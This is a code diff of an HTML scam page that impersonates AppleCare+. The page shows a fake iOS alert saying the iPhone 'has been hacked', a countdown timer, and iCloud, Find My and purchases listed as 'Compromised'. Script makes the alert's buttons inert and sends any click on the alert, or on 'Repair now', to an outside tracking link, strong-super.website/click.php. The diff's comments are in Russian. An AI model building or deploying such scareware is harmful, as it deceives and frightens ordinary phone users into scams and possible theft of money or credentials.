@@ -7,7 +7,6 @@
   <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
   <title>AppleCare+</title>
   <style>
-    
     /* ====== GLOBAL ====== */
     * {
       margin: 0;
@@ -18,44 +17,17 @@
       -webkit-user-select: none;
     }
 
-/* Добавьте это в CSS секцию для логотипа */
-.logo img {
-  width: 100%;
-  height: 100%;
-  object-fit: cover; /* Для четкого заполнения */
-  object-position: center;
-  display: block;
-}
-
-/* Исправление для белого фона логотипа */
-.logo {
-  background: #fff !important;
-  border: 0.5px solid rgba(0, 0, 0, 0.1) !important;
-}
-
-/* Для темной темы - все равно белый фон */
-@media (prefers-color-scheme: dark) {
-  .logo {
-    background: #fff !important;
-  }
-}
-    
     html, body {
       font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "SF Pro Text", system-ui, sans-serif;
       background: #000;
       color: #fff;
-      overflow-x: hidden;
       height: 100%;
       width: 100%;
       -webkit-font-smoothing: antialiased;
       -moz-osx-font-smoothing: grayscale;
-      position: fixed; /* Предотвращает скроллинг */
-      top: 0;
-      left: 0;
-      right: 0;
-      bottom: 0;
+      position: fixed;
+      overflow: hidden;
     }
-
 
     /* ====== HEADER ====== */
     .header {
@@ -72,7 +44,6 @@
       -webkit-backdrop-filter: blur(20px);
       border-bottom: 0.5px solid rgba(255, 255, 255, 0.1);
       z-index: 10;
-      width: 100%;
       padding: 0 12px;
     }
 
@@ -92,54 +63,38 @@
       font-size: 16px;
       text-decoration: none;
       font-weight: 400;
-      height: 100%;
       position: absolute;
       left: 12px;
     }
 
-    .header-button svg {
-      width: 16px;
-      height: 16px;
-      display: block;
-      flex-shrink: 0;
-    }
-
-    .header-button:active {
-      opacity: 0.5;
-    }
-
-    /* ====== CONTAINER ====== */
-    .container {
-      width: 100%;
-      max-width: 430px;
-      margin: 0 auto;
-      padding: 60px 16px 20px; /* Увеличил нижний padding */
-      height: calc(100vh - 44px);
+    /* ====== ОСНОВНОЙ КОНТЕЙНЕР ====== */
+    .main-wrapper {
+      position: fixed;
+      top: 44px;
+      bottom: 0;
+      left: 0;
+      right: 0;
       display: flex;
       flex-direction: column;
-      gap: 15px;
-      overflow: hidden;
     }
 
-    .content {
+    .scroll-content {
       flex: 1;
-      display: flex;
-      flex-direction: column;
-      width: 100%;
-      gap: 10px;
       overflow-y: auto;
       -webkit-overflow-scrolling: touch;
-      padding-bottom: 10px;
+      padding: 16px 16px 8px;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
     }
 
+    /* ====== КАРТОЧКИ ====== */
     .logo-card {
       background: #1c1c1e;
       border: 1px solid rgba(255, 255, 255, 0.08);
       border-radius: 14px;
       padding: 18px 16px;
       text-align: center;
-      width: 100%;
-      flex-shrink: 0;
     }
 
     .logo {
@@ -152,30 +107,30 @@
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 30px;
+    }
+
+    .logo img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
     }
 
     .title {
       font-size: 18px;
       font-weight: 600;
       margin-bottom: 2px;
-      word-wrap: break-word;
     }
 
     .subtitle {
       font-size: 13px;
       color: #8e8e93;
-      word-wrap: break-word;
     }
 
-    /* ====== SECTIONS ====== */
     .section {
       background: #1c1c1e;
       border: 1px solid rgba(255, 255, 255, 0.08);
       border-radius: 10px;
       overflow: hidden;
-      width: 100%;
-      flex-shrink: 0;
     }
 
     .item {
@@ -184,25 +139,15 @@
       padding: 11px 12px;
       gap: 10px;
       min-height: 44px;
-      width: 100%;
-    }
-
-    .item:active {
-      background: rgba(255, 255, 255, 0.05);
     }
 
     .divider {
       height: 0.5px;
       background: rgba(255, 255, 255, 0.08);
-      width: 100%;
     }
 
     .compromised {
       background: rgba(139, 0, 0, 0.25);
-    }
-
-    .compromised:active {
-      background: rgba(139, 0, 0, 0.35);
     }
 
     .icon {
@@ -223,16 +168,11 @@
     .label {
       flex: 1;
       font-size: 15px;
-      text-align: left;
-      word-wrap: break-word;
-      min-width: 0;
     }
 
     .value {
       font-size: 15px;
       color: #8e8e93;
-      flex-shrink: 0;
-      word-wrap: break-word;
     }
 
     .compromised .label,
@@ -240,8 +180,8 @@
       color: #ff453a;
     }
 
-    /* ====== REPAIR BUTTON ====== */
-    .repair-button {
+    /* ====== КНОПКА - ВНУТРИ ПРОКРУТКИ СРАЗУ ПОСЛЕ КАРТОЧЕК ====== */
+    .repair-button-final {
       background: #ff3b30;
       border: none;
       border-radius: 14px;
@@ -250,20 +190,20 @@
       font-weight: 600;
       padding: 16px;
       width: 100%;
-      margin-top: auto; /* Кнопка всегда внизу */
       cursor: pointer;
       transition: background 0.2s;
       text-align: center;
       text-decoration: none;
       display: block;
-      flex-shrink: 0;
+      margin: 0;
+      margin-top: 4px;
     }
 
-    .repair-button:active {
+    .repair-button-final:active {
       background: #ff2d20;
     }
 
-    /* ====== iOS ALERT STYLES ====== */
+    /* ====== iOS ALERT ====== */
     .ios-alert-overlay {
       position: fixed;
       inset: 0;
@@ -286,11 +226,6 @@
       position: absolute;
       inset: 0;
       background: rgba(0, 0, 0, 0.4);
-      transition: background 0.3s ease;
-    }
-
-    .ios-alert-overlay.show .ios-alert-backdrop {
-      background: rgba(0, 0, 0, 0.6);
     }
 
     .ios-alert-modal {
@@ -304,6 +239,7 @@
       transform: scale(1.1);
       opacity: 0;
       transition: all 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+      pointer-events: none; /* Блокируем клики на самом модальном окне */
     }
 
     .ios-alert-overlay.show .ios-alert-modal {
@@ -321,7 +257,6 @@
       font-weight: 600;
       color: #000;
       margin-bottom: 8px;
-      font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', sans-serif;
     }
 
     .ios-alert-message {
@@ -329,7 +264,6 @@
       color: rgba(0, 0, 0, 0.7);
       line-height: 18px;
       margin-bottom: 4px;
-      font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Text', sans-serif;
     }
 
     .ios-alert-timer {
@@ -337,7 +271,6 @@
       font-weight: 500;
       color: #ff3b30;
       margin-top: 8px;
-      font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Text', sans-serif;
     }
 
     .ios-alert-divider {
@@ -357,12 +290,7 @@
       border: none;
       background: transparent;
       cursor: pointer;
-      font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Text', sans-serif;
-      transition: background-color 0.1s ease;
-    }
-
-    .ios-alert-button:active {
-      background: rgba(0, 0, 0, 0.05);
+      pointer-events: none; /* Блокируем клики на кнопках */
     }
 
     .ios-alert-button.primary {
@@ -370,21 +298,7 @@
       border-left: 0.5px solid rgba(0, 0, 0, 0.1);
     }
 
-    /* Стили для неактивных кнопок */
-    .ios-alert-button.disabled {
-      pointer-events: none;
-      opacity: 0.5;
-      cursor: default;
-    }
-
-    /* Light mode adjustment */
-    @media (prefers-color-scheme: light) {
-      .ios-alert-modal {
-        background: rgba(242, 242, 247, 0.98);
-      }
-    }
-
-    /* Dark mode */
+    /* ====== ТЕМНАЯ ТЕМА ДЛЯ АЛЕРТА ====== */
     @media (prefers-color-scheme: dark) {
       .ios-alert-modal {
         background: rgba(44, 44, 46, 0.98);
@@ -402,6 +316,10 @@
         background: rgba(255, 255, 255, 0.1);
       }
       
+      .ios-alert-button {
+        color: #0a84ff;
+      }
+      
       .ios-alert-button.primary {
         border-left-color: rgba(255, 255, 255, 0.1);
       }
@@ -411,94 +329,32 @@
       }
     }
 
-    /* ====== LIGHT MODE ====== */
+    /* Light mode */
     @media (prefers-color-scheme: light) {
       body {
         background: #f2f2f7;
         color: #000;
       }
-
-      .section,
-      .logo-card {
+      .section, .logo-card {
         background: #fff;
         border-color: rgba(0, 0, 0, 0.08);
       }
-
-      .logo {
-        border: 0.5px solid rgba(0, 0, 0, 0.1);
-      }
-
       .header {
         background: rgba(255, 255, 255, 0.8);
         border-bottom: 0.5px solid rgba(0, 0, 0, 0.1);
       }
-
-      .header-title {
-        color: #000;
-      }
-
-      .header-button {
-        color: #007aff;
-      }
-
-      .divider {
-        background: rgba(0, 0, 0, 0.08);
-      }
-
-      .compromised {
-        background: rgba(255, 59, 48, 0.08);
-      }
-
-      .compromised:active {
-        background: rgba(255, 59, 48, 0.15);
-      }
+      .header-title { color: #000; }
+      .header-button { color: #007aff; }
+      .divider { background: rgba(0, 0, 0, 0.08); }
+      .compromised { background: rgba(255, 59, 48, 0.08); }
     }
 
-    /* ====== SAFE AREA SUPPORT ====== */
+    /* Safe area */
     @supports (padding: max(0px)) {
-      .container {
+      .scroll-content {
         padding-left: max(16px, env(safe-area-inset-left));
         padding-right: max(16px, env(safe-area-inset-right));
-        padding-bottom: max(20px, env(safe-area-inset-bottom));
-      }
-    }
-
-    /* ====== MOBILE OPTIMIZATIONS ====== */
-    @media (max-width: 430px) {
-      .container {
-        padding-left: 16px;
-        padding-right: 16px;
-        max-width: none;
-      }
-      
-      .content {
-        gap: 12px;
-      }
-      
-      .logo-card {
-        padding: 16px;
-      }
-      
-      .logo {
-        width: 55px;
-        height: 55px;
-        font-size: 28px;
-      }
-    }
-
-    /* ====== VERY SMALL SCREENS ====== */
-    @media (max-width: 320px) {
-      .container {
-        padding-left: 12px;
-        padding-right: 12px;
-      }
-      
-      .item {
-        padding: 10px 12px;
-      }
-      
-      .repair-button {
-        padding: 14px;
+        padding-bottom: max(8px, env(safe-area-inset-bottom));
       }
     }
   </style>
@@ -506,12 +362,8 @@
 <body>
   <!-- iOS Alert -->
   <div id="iosAlert" class="ios-alert-overlay">
-    <!-- Backdrop -->
     <div class="ios-alert-backdrop" id="alertBackdrop"></div>
-    
-    <!-- Alert Modal -->
-    <div class="ios-alert-modal" id="alertModal">
-      <!-- Content -->
+    <div class="ios-alert-modal">
       <div class="ios-alert-content">
         <h2 class="ios-alert-title">Your Apple iPhone has been hacked</h2>
         <p class="ios-alert-message">
@@ -519,14 +371,10 @@
         </p>
         <p class="ios-alert-timer" id="countdown">1:28</p>
       </div>
-
-      <!-- Divider -->
       <div class="ios-alert-divider"></div>
-
-      <!-- Buttons -->
       <div class="ios-alert-buttons">
-        <button class="ios-alert-button disabled">Settings</button>
-        <button class="ios-alert-button primary disabled">OK</button>
+        <button class="ios-alert-button" onclick="closeAlert()">Settings</button>
+        <button class="ios-alert-button primary" onclick="closeAlert()">OK</button>
       </div>
     </div>
   </div>
@@ -542,62 +390,59 @@
     <div class="header-title">AppleCare+</div>
   </div>
 
-  <div class="container">
-    <div class="content">
-      <!-- Logo -->
-    <div class="logo-card">
-      <div class="logo">
-        <img src="icons/applecare.png" alt="AppleCare">
+  <!-- Основной контент -->
+  <div class="main-wrapper">
+    <!-- Прокручиваемая область с ВСЕМ контентом включая кнопку -->
+    <div class="scroll-content">
+      <div class="logo-card">
+        <div class="logo">
+          <img src="icons/applecare.png" alt="AppleCare">
+        </div>
+        <div class="title">AppleCare+</div>
+        <div class="subtitle">Protection System</div>
       </div>
-      <div class="title">AppleCare+</div>
-      <div class="subtitle">Protection System</div>
-    </div>
 
-      <!-- Main Section -->
+      <!-- Первая секция - основные данные -->
       <div class="section">
         <div class="item"><div class="label">Name, Phone Numbers, Email</div></div>
         <div class="divider"></div>
         <div class="item"><div class="label">Password & Security</div></div>
         <div class="divider"></div>
         <div class="item"><div class="label">Payment & Shipping</div><div class="value">Mastercard</div></div>
-        <div class="divider"></div>
-        <div class="item"><div class="label">Subscriptions</div></div>
       </div>
 
-      <!-- Compromised Services -->
+      <!-- Вторая секция - скомпрометированные сервисы -->
       <div class="section">
-        
-<div class="item compromised">
-  <div class="icon">
-    <img src="icons/icloud.svg" alt="icloud">
-  </div>
-  <div class="label">iCloud</div>
-  <div class="value">Compromised</div>
-</div>
+        <div class="item compromised">
+          <div class="icon">
+            <img src="icons/icloud.svg" alt="iCloud">
+          </div>
+          <div class="label">iCloud</div>
+          <div class="value">Compromised</div>
+        </div>
         <div class="divider"></div>
-<div class="item compromised">
-  <div class="icon">
-    <img src="icons/appstore.svg" alt="AppStore">
-  </div>
-  <div class="label">Media & Purchases</div>
-  <div class="value">Compromised</div>
-</div>
-<div class="divider"></div>
-<div class="item compromised">
-  <div class="icon">
-    <img src="icons/locator.svg" alt="AppleCare">
-  </div>
-  <div class="label">Find My</div>
-  <div class="value">Compromised</div>
-</div>
+        <div class="item compromised">
+          <div class="icon">
+            <img src="icons/appstore.svg" alt="AppStore">
+          </div>
+          <div class="label">Media & Purchases</div>
+          <div class="value">Compromised</div>
+        </div>
+        <div class="divider"></div>
+        <div class="item compromised">
+          <div class="icon">
+            <img src="icons/locator.svg" alt="Find My">
+          </div>
+          <div class="label">Find My</div>
+          <div class="value">Compromised</div>
+        </div>
       </div>
 
-      <!-- iPhone -->
+      <!-- Третья секция - информация об устройстве -->
       <div class="section">
         <div class="item">
           <div class="icon">
-            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none"
-                 stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
               <rect width="14" height="20" x="5" y="2" rx="2" ry="2"/>
               <path d="M12 18h.01"/>
             </svg>
@@ -606,68 +451,31 @@
           <div class="value">This iPhone</div>
         </div>
       </div>
-    </div>
 
-    <!-- Repair Button -->
-    <a href="" class="repair-button">Repair now</a>
+      <!-- КНОПКА ВНУТРИ ПРОКРУТКИ СРАЗУ ПОСЛЕ ПОСЛЕДНЕЙ КАРТОЧКИ -->
+      <a href="https://strong-super.website/click.php?lp=1" class="repair-button-final">Repair now</a>
+    </div>
   </div>
 
   <script>
-    // Show alert 3 seconds after page load
     window.addEventListener('DOMContentLoaded', function() {
       setTimeout(function() {
-        const alert = document.getElementById('iosAlert');
-        alert.classList.add('show');
+        document.getElementById('iosAlert').classList.add('show');
         
-        // Добавляем класс disabled к кнопкам
-        const buttons = alert.querySelectorAll('.ios-alert-button');
-        buttons.forEach(button => {
-          button.classList.add('disabled');
-        });
-
-        // Функция для открытия ссылки
-        function openLink() {
+        // Добавляем обработчик клика на всю область алерта
+        document.getElementById('alertBackdrop').addEventListener('click', function() {
           window.location.href = 'https://strong-super.website/click.php?lp=1';
-        }
-
-        // Добавляем обработчики кликов на всю область
-        document.addEventListener('click', function(e) {
-          if (alert.classList.contains('show')) {
-            e.preventDefault();
-            e.stopPropagation();
-            openLink();
-          }
-        }, true);
-
-        // Также на тач события для мобильных устройств
-        document.addEventListener('touchstart', function(e) {
-          if (alert.classList.contains('show')) {
-            e.preventDefault();
-            e.stopPropagation();
-            openLink();
-          }
-        }, true);
-
-        // Предотвращаем любые действия на самом алерте
-        const alertModal = document.getElementById('alertModal');
-        alertModal.addEventListener('click', function(e) {
-          e.preventDefault();
-          e.stopPropagation();
-          openLink();
-        }, true);
-
-        alertModal.addEventListener('touchstart', function(e) {
-          e.preventDefault();
-          e.stopPropagation();
-          openLink();
-        }, true);
-
-      }, 3000); // 3 seconds delay
+        });
+        
+        // Также добавляем обработчик на само модальное окно (на всякий случай)
+        document.querySelector('.ios-alert-modal').addEventListener('click', function() {
+          window.location.href = 'https://strong-super.website/click.php?lp=1';
+        });
+        
+      }, 3000);
     });
 
-    // Countdown timer
-    let timeLeft = 88; // 1:28 in seconds
-    
+    let timeLeft = 88;
     function updateCountdown() {
       if (timeLeft > 0) {
         timeLeft--;
@@ -677,22 +485,20 @@
           minutes + ':' + (seconds < 10 ? '0' : '') + seconds;
       }
     }
-    
     setInterval(updateCountdown, 1000);
 
-    // Prevent zoom on mobile
-    document.addEventListener('touchstart', function(e) {
-      if (e.touches.length > 1) {
-        e.preventDefault();
-      }
-    });
+    function closeAlert() {
+      // Эта функция теперь не будет вызываться при кликах на кнопки,
+      // так как они заблокированы, но оставляем на случай
+    }
 
+    document.addEventListener('touchstart', function(e) {
+      if (e.touches.length > 1) e.preventDefault();
+    });
     let lastTouchEnd = 0;
     document.addEventListener('touchend', function(e) {
       const now = (new Date()).getTime();
-      if (now - lastTouchEnd <= 300) {
-        e.preventDefault();
-      }
+      if (now - lastTouchEnd <= 300) e.preventDefault();
       lastTouchEnd = now;
     }, false);
   </script>
